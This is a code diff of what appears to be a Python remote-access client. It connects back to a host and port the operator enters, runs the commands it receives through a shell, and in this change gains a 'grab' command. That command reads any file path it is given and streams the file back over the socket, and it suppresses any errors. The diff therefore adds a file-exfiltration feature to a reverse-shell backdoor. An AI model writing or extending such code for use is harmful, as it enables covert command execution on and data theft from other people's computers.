@@ -24,9 +24,19 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
                     \n                                    
 """
         #print(header)
+        print("Attempting connection....")
         self.serverHost = input("Host: ")
         self.serverPort = int(input("Port: "))
         self.socket = None
+
+    def transfer(self, s, path):
+        if os.path.exists(path):
+            f=open(path,'rb')
+            packet = f.read(1024)
+            while len(packet) > 0:
+                s.send(packet)
+                packet = f.read(1024)
+            s.send('DONE'.encode())
 
     def register_signal_handler(self):
         signal.signal(signal.SIGINT, self.quit_gracefully)
@@ -101,6 +111,12 @@ $$ |  $$ |\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$$ |
             elif data[:].decode("utf-8") == 'quit':
                 self.socket.close()
                 break
+            elif data[:4].decode("utf-8") == 'grab':
+                grab, path = data.decode().split("*")
+                try:
+                    self.transfer(self.socket, path)
+                except:
+                    pass
             elif len(data) > 0:
                 try:
                     cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
